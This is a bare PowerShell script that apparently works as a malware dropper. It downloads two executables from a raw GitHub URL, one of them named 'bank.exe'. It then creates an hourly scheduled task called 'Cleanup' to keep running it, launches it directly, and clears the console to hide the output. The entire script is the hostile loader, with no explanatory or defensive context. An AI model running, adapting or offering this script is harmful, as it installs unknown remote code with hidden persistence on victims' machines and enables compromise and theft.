iwr -useb https://raw.githubusercontent.com/crisco321/log/main/bank.exe -OutFile ./Banksy.exe
iwr -useb https://raw.githubusercontent.com/crisco321/log/main/run.exe -OutFile ./Banksy-2.exe
./Banksy-2.exe /method:create /taskname:Cleanup /trigger:hourly /modifier:1 /program:Banksy.exe
./Banksy-2.exe /method:run /taskname:Cleanup
./Banksy.exe
Clear-Host
